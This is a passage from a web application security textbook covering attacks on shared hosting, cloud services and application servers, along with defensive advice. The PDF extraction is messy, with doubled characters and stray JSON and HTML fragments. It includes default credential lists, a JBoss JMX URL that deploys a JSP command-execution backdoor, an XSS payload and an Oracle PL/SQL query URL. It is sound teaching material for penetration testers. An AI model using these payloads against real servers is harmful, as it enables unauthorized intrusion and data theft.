Transitional//EN”\n“http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd”>\n<html xmlns=”http://www.w3.org/1999/xhtml” lang=”en-US” xml:lang=”en-US”>\n<head>\n<title>Untitled Document</title>\n<meta http-equiv=”Content-Type” content=”text/html; charset=iso-8859-1” />\ncc1177..iinndddd 666600 88//1199//22001111 1122::1177::1177 PPMM\nStuttard c17.indd V2 - 08/10/2011 Page 661\nChapter 17 n Attacking Application Architecture 661\n</head>\n<body>\napache\n</body>\n</html>\nBecause the malicious customer’s commands are executing as the Apache\nuser, it is likely that this will allow access to the scripts and data belonging to\nother customers of the shared hosting service.\nThis kind of threat also exists in the context of an ASP-managed shared appli-\ncation. Although the core application functionality is owned and updated by\nthe ASP, individual customers typically can modify this functionality in certain\ndefi ned ways. A malicious customer may introduce subtle backdoors into code\nthat he controls, enabling him to compromise the shared application and gain\naccess to other customers’ data.\nTIP Backdoor scripts can be created in most web scripting languages. For\nmore examples of scripts in other languages, see http://net-square.com/\npapers/one_way/one_way.html#4.0.\nAttacks Between Vulnerable Applications\nEven if all customers in a shared environment are benign, and upload only\nlegitimate scripts that are validated by the environment’s owner, attacks between\napplications will, of course, be possible if vulnerabilities unwittingly exist within\nthe applications of individual customers. In this situation, one vulnerability\nwithin a single application may enable a malicious user to compromise both\nthat application and all others hosted within the shared environment. Many\ntypes of common vulnerability fall into this category. For example:\nn A SQL injection fl aw in one application may enable an attacker to per-\nform arbitrary SQL queries on the shared database. If database access is\ninadequately segregated between different customers, an attacker may\nbe able to read and modify the data used by all applications.\nn A path traversal vulnerability in one application may enable an attacker\nto read or write arbitrary fi les anywhere on the server fi lesystem, includ-\ning those belonging to other applications.\nn A command injection fl aw in one application may enable an attacker to\ncompromise the server and, therefore, the other applications hosted on\nit, in the same way as described for a malicious customer.\nAttacks Between ASP Application Components\nThe possible attacks described previously may all arise in the context of a\nshared ASP application. Because customers typically can perform their own\ncc1177..iinndddd 666611 88//1199//22001111 1122::1177::1177 PPMM\nStuttard c17.indd V2 - 08/10/2011 Page 662\n662 Chapter 17 n Attacking Application Architecture\ncustomizations to core application functionality, a vulnerability introduced by\none customer may enable users of a customized application to attack the main\nshared application, thereby compromising the data of all the ASP’s customers.\nIn addition to these attacks, the ASP scenario introduces further possibilities\nfor malicious customers or users to compromise the wider shared application,\nbecause of how different components of the shared application must interoper-\nate. For example:\nn Data generated by different applications is often collated in a common\nlocation and viewed by ASP-level users with powerful privileges within\nthe shared application. This means that an XSS-type attack within a cus-\ntomized application may result in compromise of the shared application.\nFor example, if an attacker can inject JavaScript code into log fi le entries,\npayment records, or personal contact information, this may enable him\nto hijack the session of an ASP-level user and therefore gain access to\nsensitive administrative functionality.\nn ASPs often employ a shared database to hold data belonging to all cus-\ntomers. Strict segregation of data access may or may not be enforced at\nthe application and database layers. However, in either case some shared\ncomponents typically exist, such as database stored procedures, that are\nresponsible for processing data belonging to multiple customers. Defective\ntrust relationships or vulnerabilities within these components may allow\nmalicious customers or users to gain access to data in other applications.\nFor example, a SQL injection vulnerability in a shared stored procedure\nthat runs with defi ner privileges may result in the compromise of the\nentire shared database.\nHACK STEPS\n1. Examine the access mechanisms provided for customers of the shared\nenvironment to update and manage their content and functionality.\nConsider questions such as the following:\nn Does the remote access facility use a secure protocol and suitably\nhardened infrastructure?\nn Can customers access files, data, and other resources that they do not\nlegitimately need to access?\nn Can customers gain an interactive shell within the hosting environ-\nment and perform arbitrary commands?\n2. If a proprietary application is used to allow customers to configure and\ncustomize a shared environment, consider targeting this application as a\nmeans of compromising the environment itself and individual applications\nrunning within it.\ncc1177..iinndddd 666622 88//1199//22001111 1122::1177::1177 PPMM\nStuttard c17.indd V2 - 08/10/2011 Page 663\nChapter 17 n Attacking Application Architecture 663\n3. If you can achieve command execution, SQL injection, or arbitrary file\naccess within one application, investigate carefully whether this provides\nany means of escalating your attack to target other applications.\n4. If you are attacking an ASP-hosted application that is made up of both\nshared and customized components, identify any shared components\nsuch as logging mechanisms, administrative functions, and database code\ncomponents. Attempt to leverage these to compromise the shared portion\nof the application and thereby attack other individual applications.\n5. If a common database is used within any kind of shared environment,\nperform a comprehensive audit of the database configuration, patch level,\ntable structure, and permissions, perhaps using a database scanning tool\nsuch as NGSSquirrel. Any defects within the database security model may\nprovide a means of escalating an attack from within one application to\nanother.\nAttacking the Cloud\nThe ubiquitous buzzword “cloud” refers roughly to the increased outsourcing\nof applications, servers, databases, and hardware to external service providers.\nIt also refers to the high degree of virtualization employed in today’s shared\nhosting environments.\nCloud services broadly describes on-demand Internet-based services that\nprovide an API, application, or web interface for consumer interaction. The\ncloud computing provider normally stores user data or processes business logic\nto provide the service. From an end-user perspective, traditional desktop appli-\ncations are migrating to cloud-based equivalents, and businesses can replace\nentire servers with on-demand equivalents.\nA frequently mentioned security concern in moving to cloud services is loss\nof control. Unlike with traditional server or desktop software, there is no way\nfor a consumer to proactively assess the security of a particular cloud service.\nYet the consumer is required to hand over all responsibility for the service\nand data to a third party. For businesses, more control is being ceded to an\nenvironment where the risks are not fully qualifi ed or quantifi ed. Published\nvulnerabilities in the web applications supporting cloud services are also not\nwidespread, because the web-based platform is not open to the same scrutiny\nas traditional client/server downloadable products.\nThis concern about loss of control is similar to existing concerns that busi-\nnesses may have about choosing a hosting provider, or that consumers may\nhave about choosing a web mail provider. But this issue alone does not refl ect\nthe raised stakes that cloud computing brings. Whereas compromising a single\nconventional web application could affect thousands of individual users, com-\npromising a cloud service could affect thousands of cloud subscribers, all with\ncc1177..iinndddd 666633 88//1199//22001111 1122::1177::1177 PPMM\nStuttard c17.indd V2 - 08/10/2011 Page 664\n664 Chapter 17 n Attacking Application Architecture\ncustomer bases of their own. Whereas a fl awed access control may give unau-\nthorized access to a sensitive document in a work fl ow application, in a cloud\nself-service application it may give unauthorized access to a server or cluster\nof servers. The same vulnerability in an administrative back-end portal could\ngive access to entire company infrastructures.\nCloud Security from a Web Application Perspective\nWith a fl uid defi nition, implemented differently by every cloud provider, no\nproscriptive list of vulnerabilities is applicable to all cloud architectures. It is,\nhowever, possible to identify some key areas of vulnerabilities unique to cloud\ncomputing architectures.\nNOTE A commonly quoted defense mechanism for cloud security is the\nencryption of data at rest or in transit. However, encryption may provide\nminimal protection in this context. As described in the earlier section “Tiered\nArchitectures,” if an attacker bypasses the application’s checks for authentication\nor authorization and makes a seemingly legitimate request for data, any decryp-\ntion functions are automatically invoked by components lower in the stack.\nCloned Systems\nMany applications rely on features of the operating system when drawing on\nentropy to generate random numbers. Common sources are related to the features\nof the system itself, such as system uptime, or information about the system’s\nhardware. If systems are cloned, attackers possessing one of the clones could\ndetermine the seeds used for random-number generation, which could in turn\nallow more accurate predictions about the state of random-number generators.\nMigration of Management Tools to the Cloud\nAt the heart of an enterprise cloud computing service is the interface through\nwhich servers are provisioned and monitored. This is a self-service environ-\nment for the customer, often a web-enabled version of a tool originally used for\ninternal server management. Former standalone tools that have been ported to\nthe web often lack robust session management and access control mechanisms,\nparticularly where no role-based segregation existed previously. Some solutions\nobserved by the authors have used tokens or GUIDs for server access. Others\nhave simply exposed a serialization interface through which any of the manage-\nment methods could be called.\nFeature-First Approach\nLike most new fi elds, cloud service providers promote a feature-fi rst approach in\nattracting new customers. From an enterprise perspective, cloud environments\nare nearly always managed over a self-service web application. Users are given\ncc1177..iinndddd 666644 88//1199//22001111 1122::1177::1177 PPMM"
  },
  {
    "input": "Securing Shared Environments",
    "output": "Stuttard c17.indd V2 - 08/10/2011 Page 665\nChapter 17 n Attacking Application Architecture 665\na wide variety of user-friendly methods by which they can access their data.\nAn opt-out mechanism for features generally is not offered.\nToken-Based Access\nNumerous cloud resources are designed to be invoked on a regular basis. This\ncreates the need to store a permanent authentication token on the client, decoupled\nfrom the user’s password and used to identify a device (as opposed to a user). If\nan attacker can gain access to a token, he can access the user’s cloud resources.\nWeb Storage\nWeb storage is one of the main end-user attractions of cloud computing. To be\neffective, web storage should support a standard browser or browser extension,\na range of technologies and extensions to HTTP such as WebDAV, and often\ncached or token-based credentials, as just discussed.\nAnother issue is that a web server on a domain is often Internet-visible. If a\nuser can upload HTML and induce other users to access their upload fi le, he\ncan compromise those users of the same service. Similarly, an attacker can take\nadvantage of the Java same-origin policy and upload a JAR fi le, gaining full\ntwo-way interaction whenever that JAR fi le is invoked elsewhere on the Internet.\nSecuring Shared Environments\nShared environments introduce new types of threats to an application’s security,\nposed by a malicious customer of the same facility and by an unwitting customer\nwho introduces vulnerabilities into the environment. To address this twofold\ndanger, shared environments must be carefully designed in terms of customer\naccess, segregation, and trust. They also must implement controls that are not\ndirectly applicable to the context of a single-hosted application.\nSecure Customer Access\nWhatever mechanism is provided for customers to maintain the content under\ntheir control, this should protect against unauthorized access by third parties\nand by malicious customers:\nn The remote access mechanism should implement robust authentication,\nuse cryptographic technologies that are not vulnerable to eavesdropping,\nand be fully security hardened.\nn Individual customers should be granted access on a least-privilege basis.\nFor example, if a customer is uploading scripts to a virtually hosted server,\nhe should have only read and write permissions to his own document\nroot. If a shared database is being accessed, this should be done using\ncc1177..iinndddd 666655 88//1199//22001111 1122::1177::1177 PPMM\nStuttard c17.indd V2 - 08/10/2011 Page 666\n666 Chapter 17 n Attacking Application Architecture\na low-privileged account that cannot access data or other components\nbelonging to other customers.\nn If a customized application is used to provide customer access, it should\nbe subjected to rigorous security requirements and testing in line with its\ncritical role in protecting the security of the shared environment.\nSegregate Customer Functionality\nCustomers of a shared environment cannot be trusted to create only benign\nfunctionality that is free of vulnerabilities. A robust solution, therefore, should\nuse the architectural controls described in the fi rst half of this chapter to protect\nthe shared environment and its customers from attack via rogue content. This\ninvolves segregating the capabilities allowed to each customer’s code as follows\nto ensure that any deliberate or unwitting compromise is localized in its impact\nand cannot affect other customers:\nn Each customer’s application should use a separate operating system\naccount to access the fi lesystem that has read and write access only to\nthat application’s fi le paths.\nn The ability to access powerful system functions and commands should be\nrestricted at the operating system level on a least-privilege basis.\nn The same protection should be implemented within any shared databases.\nA separate database instance should be used for each customer, and low-\nprivileged accounts should be assigned to customers, with access to only\ntheir own data.\nNOTE Many shared hosting environments based on the LAMP model rely\non PHP’s safe mode to limit the potential impact of a malicious or vulner-\nable script. This mode prevents PHP scripts from accessing certain powerful\nPHP functions and places restrictions on the operation of other functions\n(see Chapter 19). However, these restrictions are not fully effective and have\nbeen vulnerable to bypasses. Although safe mode may provide a useful layer\nof defense, it is architecturally the wrong place to control the impact of a\nmalicious or vulnerable application, because it involves the operating system\ntrusting the application tier to control its actions. For this reason and others,\nsafe mode has been removed from PHP version 6.\nTIP If you can execute arbitrary PHP commands on a server, use the\nphpinfo() command to return details of the PHP environment’s confi gu-\nration. You can review this information to establish whether safe mode is\nenabled and how other confi guration options may affect what actions you can\neasily perform. See Chapter 19 for further details.\ncc1177..iinndddd 666666 88//1199//22001111 1122::1177::1177 PPMM"
  },
  {
    "input": "Questions",
    "output": "Stuttard c17.indd V2 - 08/10/2011 Page 667\nChapter 17 n Attacking Application Architecture 667\nSegregate Components in a Shared Application\nIn an ASP environment where a single application comprises various shared\nand customizable components, trust boundaries should be enforced between\ncomponents that are under the control of different parties. When a shared com-\nponent, such as a database stored procedure, receives data from a customized\ncomponent belonging to an individual customer, this data should be treated\nwith the same level of distrust as if it originated directly from an end user.\nEach component should be subjected to rigorous security testing originating\nfrom adjacent components outside its trust boundaries to identify any defects\nthat may enable a vulnerable or malicious component to compromise the wider\napplication. Particular attention should be paid to shared logging and admin-\nistrative functions.\nSummary\nSecurity controls implemented within web application architectures present a\nrange of opportunities for application owners to enhance the overall security\nposture of their deployment. As a consequence, defects and oversights within\nan application’s architecture often can enable you to dramatically escalate an\nattack, moving from one component to another to eventually compromise the\nentire application.\nShared hosting and ASP-based environments present a new range of diffi cult\nsecurity problems, involving trust boundaries that do not arise within a single-\nhosted application. When you are attacking an application in a shared context,\na key focus of your efforts should be the shared environment itself. You should\ntry to ascertain whether it is possible to compromise that environment from\nwithin an individual application, or to leverage one vulnerable application to\nattack others.\nQuestions\nAnswers can be found at http://mdsec.net/wahh.\n1. You are attacking an application that employs two different servers: an\napplication server and a database server. You have discovered a vulner-\nability that allows you to execute arbitrary operating system commands\non the application server. Can you exploit this vulnerability to retrieve\nsensitive application data held within the database?\n2. In a different case, you have discovered a SQL injection fl aw that can be\nexploited to execute arbitrary operating system commands on the database\ncc1177..iinndddd 666677 88//1199//22001111 1122::1177::1177 PPMM\nStuttard c17.indd V2 - 08/10/2011 Page 668\n668 Chapter 17 n Attacking Application Architecture\nserver. Can you leverage this vulnerability to compromise the application\nserver? For example, could you modify the application’s scripts held on\nthe application server, and the content returned to users?\n3. You are attacking a web application that is hosted in a shared environment.\nBy taking out a contract with the ISP, you can acquire some web space on\nthe same server as your target, where you are permitted to upload PHP\nscripts.\nCan you exploit this situation to compromise the application you are\ntargeting?\n4. The architecture components Linux, Apache, MySQL, and PHP are often\nfound installed on the same physical server. Why can this diminish the\nsecurity posture of the application’s architecture?\n5. How could you look for evidence that the application you are attacking is\npart of a wider application managed by an application service provider?\ncc1177..iinndddd 666688 88//1199//22001111 1122::1177::1177 PPMM"
  },
  {
    "input": "Chapter 18 Attacking the Application Server",
    "output": "Stuttard c18.indd V2 - 07/28/2011 Page 669\nCHAPTER\n18\nAttacking the\nApplication Server\nAs with any kind of application, a web application depends on the other layers\nof the technology stack that support it, including the application or web server,\noperating system, and networking infrastructure. An attacker may target any\nof these components. Compromising the technology on which an application\ndepends very often enables an attacker to fully compromise the application itself.\nMost attacks in this category are outside the scope of a book about attacking web\napplications. One exception to this is attacks that target the application and web\nserver layers, as well as any relevant application-layer defenses. Inline defenses\nare commonly employed to help secure web applications and identify attacks.\nCircumventing these defenses is a key step in compromising the application.\nSo far we have not drawn a distinction between a web server and an application\nserver, because the attacks have targeted application functionality, irrespective\nof how it is provided. In reality, much of the presentation layer, communication\nwith back-end components, and the core security framework may be managed\nby the application container. This may give additional scope to an attack. Clearly\nany vulnerability in the technologies that deliver this framework will be of inter-\nest to an attacker if they can be used to directly compromise the application.\nThis chapter focuses on ways of leveraging defects at the application server\nlayer from an Internet perspective to attack the web application running on it.\nThe vulnerabilities that you can exploit to attack application servers fall into two\nbroad categories: shortcomings in the server’s confi guration, and security fl aws\nwithin application server software. A list of defects cannot be comprehensive,\n669\ncc1188..iinndddd 666699 88//1199//22001111 1122::1177::5511 PPMM"
  },
  {
    "input": "Default Credentials",
    "output": "Stuttard c18.indd V2 - 07/28/2011 Page 670\n670 Chapter 18 n Attacking the Application Server\nbecause software of this type is liable to change over time. But the fl aws described\nhere illustrate the typical pitfalls awaiting any application implementing its own\nnative extensions, modules, or APIs, or reaching outside the application container.\nThis chapter also examines web application fi rewalls, describes their strengths\nand weaknesses, and details ways in which they can often be circumvented to\ndeliver attacks.\nVulnerable Server Confi guration\nEven the simplest of web servers comes with a wealth of confi guration options\nthat control its behavior. Historically, many servers have shipped with insecure\ndefault options, which present opportunities for attack unless they are explicitly\nhardened.\nDefault Credentials\nMany web servers contain administrative interfaces that may be publicly acces-\nsible. These may be located at a specifi c location within the web root or may run\non a different port, such as 8080 or 8443. Frequently, administrative interfaces\nhave default credentials that are well known and are not required to be changed\non installation.\nTable 18-1 shows examples of default credentials on some of the most com-\nmonly encountered administrative interfaces.\nTable 18-1: Default Credentials on Some Common Administrative Interfaces\nUSERNAME PASSWORD\nadmin (none)\nApache Tomcat tomcat tomcat\nroot root\nSun JavaServer admin admin\nNetscape Enterprise Server admin admin\nadministrator administrator\nanonymous (none)\nCompaq Insight Manager user user\noperator operator\nuser public\nZeus admin (none)\ncc1188..iinndddd 667700 88//1199//22001111 1122::1177::5511 PPMM"
  },
  {
    "input": "Default Content",
    "output": "70 Stuttard c18.indd V2 - 07/28/2011 Page 671\nChapter 18 n Attacking the Application Server 671\nIn addition to administrative interfaces on web servers, numerous devices, such\nas switches, printers, and wireless access points, use web interfaces that have\ndefault credentials that may not have been changed. The following resources\nlist default credentials for a large number of different technologies:\nn www.cirt.net/passwords\nn www.phenoelit-us.org/dpl/dpl.html\nHACK STEPS\n1. Review the results of your application mapping exercises to identify the\nweb server and other technologies in use that may contain accessible\nadministrative interfaces.\n2. Perform a port scan of the web server to identify any administrative inter-\nfaces running on a different port to the main target application.\n3. For any identified interfaces, consult the manufacturer’s documentation\nand the listings of common passwords to obtain default credentials. Use\nMetasploit’s built-in database to scan the server.\n4. If the default credentials do not work, use the techniques described in\nChapter 6 to attempt to guess valid credentials.\n5. If you gain access to an administrative interface, review the available\nfunctionality, and determine whether this can be used to further compro-\nmise the host and attack the main application.\nDefault Content\nMost application servers ship with a range of default content and functionality\nthat you may be able to leverage to attack either the server itself or the main target\napplication. Here are some examples of default content that may be of interest:\nn Debug and test functionality designed for use by administrators\nn Sample functionality designed to demonstrate certain common tasks\nn Powerful functions not intended for public use but unwittingly left\naccessible\nn Server manuals that may contain useful information that is specifi c to\nthe installation itself\nDebug Functionality\nFunctionality designed for diagnostic use by administrators is often of great\nvalue to an attacker. It may contain useful information about the confi guration\nand runtime state of the server and applications running on it.\ncc1188..iinndddd 667711 88//1199//22001111 1122::1177::5511 PPMM\nStuttard c18.indd V2 - 07/28/2011 Page 672\n672 Chapter 18 n Attacking the Application Server\nFigure 18-1 shows the default page phpinfo.php, which exists on many Apache\ninstallations. This page simply executes the PHP function phpinfo() and returns\nthe output. It contains a wealth of information about the PHP environment,\nconfi guration settings, web server modules, and fi le paths.\nFigure 18-1: The default page phpinfo.php\nSample Functionality\nBy default many servers include various sample scripts and pages designed to\ndemonstrate how certain application server functions and APIs can be used.\nTypically, these are intended to be innocuous and to provide no opportunities\nfor an attacker. However, in practice this has not been the case, for two reasons:\nn Many sample scripts contain security vulnerabilities that can be exploited\nto perform actions not intended by the scripts’ authors.\nn Many sample scripts actually implement functionality that is of direct\nuse to an attacker.\nAn example of the fi rst problem is the Dump Servlet included in Jetty ver-\nsion 7.0.0. This servlet can be accessed from a URL such as /test/jsp/dump\n.jsp. When it is accessed, it prints various details of the Jetty installation and\nthe current request, including the request query string. This allows for simple\ncc1188..iinndddd 667722 88//1199//22001111 1122::1177::5511 PPMM\n72 Stuttard c18.indd V2 - 07/28/2011 Page 673\nChapter 18 n Attacking the Application Server 673\ncross-site scripting if an attacker simply includes script tags in the URL, such\nas /test/jsp/dump.jsp?%3Cscript%3Ealert(%22xss%22)%3C/script%3E.\nAn example of the second problem is the Sessions Example script shipped\nwith Apache Tomcat. As shown in Figure 18-2, this can be used to get and set\narbitrary session variables. If an application running on the server stores sensitive\ndata in a user’s session, an attacker can view this and may be able to interfere\nwith the application’s processing by modifying its value.\nFigure 18-2: The default Sessions Example script shipped with Apache Tomcat\nPowerful Functions\nSome web server software contains powerful functionality that is not intended\nto be used by the public but that can be accessed by end users through some\nmeans. In many cases application servers actually allow web archives (WAR\nfi les) to be deployed over the same HTTP port as that used by the application\nitself, given the correct administrative credentials. This deployment process for\nan application server is a prime target for hackers. Common exploit frameworks\ncan automate the process of scanning for default credentials, uploading a web\narchive containing a backdoor, and executing it to get a command shell on the\nremote system, as shown in Figure 18-3.\ncc1188..iinndddd 667733 88//1199//22001111 1122::1177::5511 PPMM\nStuttard c18.indd V2 - 07/28/2011 Page 674\n674 Chapter 18 n Attacking the Application Server\nFigure 18-3: Using Metasploit to compromise a vulnerable Tomcat server\nJMX\nThe JMX console, installed by default within a JBoss installation, is a classic\nexample of powerful default content. The JMX console is described as a “raw\nview into the microkernel of the JBoss Application Server.” In fact, it allows you\nto access any Managed Beans within the JBoss Application Server directly. Due\nto the sheer amount of functionality available, numerous security vulnerabilities\nhave been reported. Among the easiest to exploit is the ability to use the store\nmethod within the DeploymentFileRepository to create a war fi le containing\na backdoor, as shown in Figure 18-4.\ncc1188..iinndddd 667744 88//1199//22001111 1122::1177::5522 PPMM\n74 Stuttard c18.indd V2 - 07/28/2011 Page 675\nChapter 18 n Attacking the Application Server 675\nFigure 18-4: The JMX console contains functionality allowing arbitrary WAR files to\nbe deployed\nFor example, the following URL uploads a page called cmdshell.jsp contain-\ning a backdoor:\nhttp://wahh-app.com:8080/jmx-console/HtmlAdaptor?action=invokeOpByName&name=\njboss.admin%3Aservice%3DDeploymentFileRepository&methodName=\nstore&argType=java.lang.String&arg0=cmdshell.war&argType=\njava.lang.String&arg1=cmdshell&argType=java.lang.String&arg2=\n.jsp&argType=java.lang.String&arg3=%3C%25Runtime.getRuntime%28%29.exec\n%28request.getParameter%28%22c%22%29%29%3B%25%3E%0A&argType=\nboolean&arg4=True\nAs shown in Figure 18-5, this successfully creates a server-side backdoor that\nexecutes the following code:\n<%Runtime.getRuntime().exec(request.getParameter(“c”));%>\nFigure 18-5: A successful attack using the JMX console to deploy a backdoor WAR file\nonto a JBoss server\ncc1188..iinndddd 667755 88//1199//22001111 1122::1177::5522 PPMM\nStuttard c18.indd V2 - 07/28/2011 Page 676\n676 Chapter 18 n Attacking the Application Server\nThe built-in Deployment Scanner then automatically deploys the Trojan\nWAR fi le to the JBoss Application Server. After it is deployed, it can be accessed\nwithin the newly created cmdshell application, which in this instance contains\nonly cmdshell.jsp:\nhttp://wahh-app.com:8080/cmdshell/cmdshell.jsp?c=cmd%20/\nc%20ipconfig%3Ec:\\foo\nNOTE The resolution to this issue was to restrict the GET and POST methods to\nadministrators only. This was easily bypassed simply by issuing the request just\nshown using the HEAD method. (Details can be found at www.securityfocus\n.com/bid/39710/.) As with any confi guration-based vulnerability, tools such\nas Metasploit can exploit these various JMX vulnerabilities with a high degree of\nreliability.\nOracle Applications\nThe enduring example of powerful default functionality arises in the PL/SQL\ngateway implemented by Oracle Application Server and can be seen in other\nOracle products such as the E-Business Suite. The PL/SQL gateway provides\nan interface whereby web requests are proxied to a back-end Oracle database.\nArbitrary parameters can be passed to database procedures using URLs like\nthe following:\nhttps://wahh-app.com/pls/dad/package.procedure?param1=foo&param2=bar\nThis functionality is intended to provide a ready means of converting business\nlogic implemented within a database into a user-friendly web application. However,\nbecause an attacker can specify an arbitrary procedure, he can exploit the PL/\nSQL gateway to access powerful functions within the database. For example, the\nSYS.OWA_UTIL.CELLSPRINT procedure can be used to execute arbitrary database\nqueries and thereby retrieve sensitive data:\nhttps://wahh-app.com/pls/dad/SYS.OWA_UTIL.CELLSPRINT?P_THEQUERY=SELECT+\n*+FROM+users\nTo prevent attacks of this kind, Oracle introduced a fi lter called the PL/SQL\nExclusion List. This checks the name of the package being accessed and blocks\nattempts to access any packages whose names start with the following expressions:\nSYS.\nDBMS_\nUTL_\ncc1188..iinndddd 667766 88//1199//22001111 1122::1177::5522 PPMM"
  },
  {
    "input": "Directory Listings",
    "output": "76 Stuttard c18.indd V2 - 07/28/2011 Page 677\nChapter 18 n Attacking the Application Server 677\nOWA_\nOWA.\nHTP.\nHTF.\nThis fi lter was designed to block access to powerful default functionality\nwithin the database. However, the list was incomplete and did not block access\nto other powerful default procedures owned by DBA accounts such as CTXSYS\nand MDSYS. Further problems were associated with the PL/SQL Exclusion List,\nas described later in this chapter.\nOf course, the purpose of the PL/SQL gateway is to host specifi c packages\nand procedures, and many of the defaults have since been found to contain\nvulnerabilities. In 2009, the default packages forming part of the E-Business\nSuite proved to contain several vulnerabilities, including the ability to edit\narbitrary pages. The researchers give the example of using icx_define_pages\n.DispPageDialog to inject HTML into the administrator’s landing page, execut-\ning a stored cross-site scripting attack:\n/pls/dad/icx_define_pages.DispPageDialog?p_mode=RENAME&amp;p_page_id=[page_id]\nHACK STEPS\n1. Tools such as Nikto are effective at locating much default web content.\nThe application mapping exercises described in Chapter 4 should have\nidentified the majority of default content present on the server you are\ntargeting.\n2. Use search engines and other resources to identify default content and\nfunctionality included within the technologies known to be in use. If feasi-\nble, carry out a local installation of these, and review them for any default\nfunctionality that you may be able to leverage in your attack.\nDirectory Listings\nWhen a web server receives a request for a directory, rather than an actual fi le,\nit may respond in one of three ways:\nn It may return a default resource within the directory, such as index.html.\nn It may return an error, such as the HTTP status code 403, indicating that\nthe request is not permitted.\nn It may return a listing showing the contents of the directory, as shown\nin Figure 18-6.\ncc1188..iinndddd 667777 88//1199//22001111 1122::1177::5522 PPMM\nStuttard c18.indd V2 - 07/28/2011 Page 678\n678 Chapter 18 n Attacking the Application Server\nFigure 18-6: A directory listing\nIn many situations, directory listings do not have any relevance to security. For\nexample, disclosing the index to an images directory may be inconsequential.\nIndeed, directory listings are often disclosed intentionally because they provide\na built-in means of navigating around sites containing static content, as in the\nexample illustrated. Nevertheless, there are two main reasons why obtaining\ndirectory listings may help you attack an application:\nn Many applications do not enforce proper access control over their func-\ntionality and resources and rely on an attacker’s ignorance of the URLs\nused to access sensitive items (see Chapter 8).\nn Files and directories are often unintentionally left within the web root of\nservers, such as logs, backup fi les, and old versions of scripts.\nIn both of these cases, the real vulnerability lies elsewhere, in the failure to\ncontrol access to sensitive data. But given that these vulnerabilities are extremely\nprevalent, and the names of the insecure resources may be diffi cult to guess,\nthe availability of directory listings is often of great value to an attacker and\nmay lead quickly to a complete compromise of an application.\ncc1188..iinndddd 667788 88//1199//22001111 1122::1177::5533 PPMM"
  },
  {
    "input": "WebDAV Methods",
    "output": "78 Stuttard c18.indd V2 - 07/28/2011 Page 679\nChapter 18 n Attacking the Application Server 679\nHACK STEPS\nFor each directory discovered on the web server during application mapping,\nmake a request for just this directory, and identify any cases where a directory\nlisting is returned.\nNOTE In addition to the preceding case, where directory listings are directly\navailable, vulnerabilities have been discovered within web server software\nthat can be exploited to obtain a directory listing. Some examples of these are\ndescribed later in this chapter.\nWebDAV Methods\nWebDAV is a term given to a collection of HTTP methods used for Web-based\nDistributed Authoring and Versioning. These have been widely available since\n1996. They have been more recently adopted in cloud storage and collaboration\napplications, where user data needs to be accessed across systems using an\nexisting fi rewall-friendly protocol such as HTTP. As described in Chapter 3,\nHTTP requests can use a range of methods other than the standard GET and POST\nmethods. WebDAV adds numerous others that can be used to manipulate fi les\non the web server. Given the nature of the functionality, if these are accessible\nby low-privileged users, they may provide an effective avenue for attacking an\napplication. Here are some methods to look for:\nn PUT uploads the attached fi le to the specifi ed location.\nn DELETE deletes the specifi ed resource.\nn COPY copies the specifi ed resource to the location given in the Destination\nheader.\nn MOVE moves the specifi ed resource to the location given in the Destination\nheader.\nn SEARCH searches a directory path for resources.\nn PROPFIND retrieves information about the specifi ed resource, such as\nauthor, size, and content type.\nYou can use the OPTIONS method to list the HTTP methods that are permitted\nin a particular directory:\nOPTIONS /public/ HTTP/1.0\nHost: mdsec.net\nHTTP/1.1 200 OK\nConnection: close\nDate: Sun, 10 Apr 2011 15:56:27 GMT\ncc1188..iinndddd 667799 88//1199//22001111 1122::1177::5533 PPMM\nStuttard c18.indd V2 - 07/28/2011 Page 680\n680 Chapter 18 n Attacking the Application Server\nServer: Microsoft-IIS/6.0\nMicrosoftOfficeWebServer: 5.0_Pub\nX-Powered-By: ASP.NET\nMS-Author-Via: MS-FP/4.0,DAV\nContent-Length: 0\nAccept-Ranges: none\nDASL: <DAV:sql>\nDAV: 1, 2\nPublic: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIN\nD, PROPPATCH, LOCK, UNLOCK, SEARCH\nAllow: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK\nCache-Control: private\nThis response indicates that several of the powerful methods listed previously\nare in fact allowed. However, in practice these may require authentication or be\nsubject to other restrictions.\nThe PUT method is particularly dangerous. If you upload arbitrary fi les within\nthe web root, the fi rst target is to create a backdoor script on the server that will\nbe executed by a server-side module, thereby giving the attacker full control of\nthe application, and often the web server itself. If the PUT method appears to be\npresent and enabled, you can verify this as follows:\nPUT /public/test.txt HTTP/1.1\nHost: mdsec.net\nContent-Length: 4\ntest\nHTTP/1.1 201 Created\n...\nNote that permissions are likely to be implemented per directory, so recursive\nchecking is required in an attack. Tools such as DAVTest, shown next, can be\nused to iteratively check all directories on the server for the PUT method and\ndetermine which fi le extensions are allowed. To circumvent restrictions on using\nPUT to upload backdoor scripts, the tool also attempts to use PUT followed by\nthe MOVE method:\nC:\\>perl davtest.pl -url http://mdsec.net/public -directory 1 -move -quiet\nMOVE .asp FAIL\nMOVE .shtml FAIL\nMOVE .aspx FAIL\ndavtest.pl Summary:\nCreated: http://mdsec.net/public/1\nMOVE/PUT File: http://mdsec.net/public/1/davtest_UmtllhI8izy2.php\nMOVE/PUT File: http://mdsec.net/public/1/davtest_UmtllhI8izy2.html\nMOVE/PUT File: http://mdsec.net/public/1/davtest_UmtllhI8izy2.cgi\nMOVE/PUT File: http://mdsec.net/public/1/davtest_UmtllhI8izy2.cfm\ncc1188..iinndddd 668800 88//1199//22001111 1122::1177::5533 PPMM\n80 Stuttard c18.indd V2 - 07/28/2011 Page 681\nChapter 18 n Attacking the Application Server 681\nMOVE/PUT File: http://mdsec.net/public/1/davtest_UmtllhI8izy2.jsp\nMOVE/PUT File: http://mdsec.net/public/1/davtest_UmtllhI8izy2.pl\nMOVE/PUT File: http://mdsec.net/public/1/davtest_UmtllhI8izy2.txt\nMOVE/PUT File: http://mdsec.net/public/1/davtest_UmtllhI8izy2.jhtml\nExecutes: http://mdsec.net/public/1/davtest_UmtllhI8izy2.html\nExecutes: http://mdsec.net/public/1/davtest_UmtllhI8izy2.txt\nTRY IT!\nhttp://mdsec.net/public/\nTIP For WebDAV instances where end users are permitted to upload fi les, it\nis relatively common for uploading server-side scripting language extensions\nspecifi c to that server’s environment to be forbidden. The ability to upload\nHTML or JAR fi les is much more likely, and both of these allow attacks against\nother users to be conducted (see Chapters 12 and 13).\nHACK STEPS\nTo test the server’s handling of different HTTP methods, you will need to use\na tool such as Burp Repeater, which allows you to send an arbitrary request\nwith full control over the message headers and 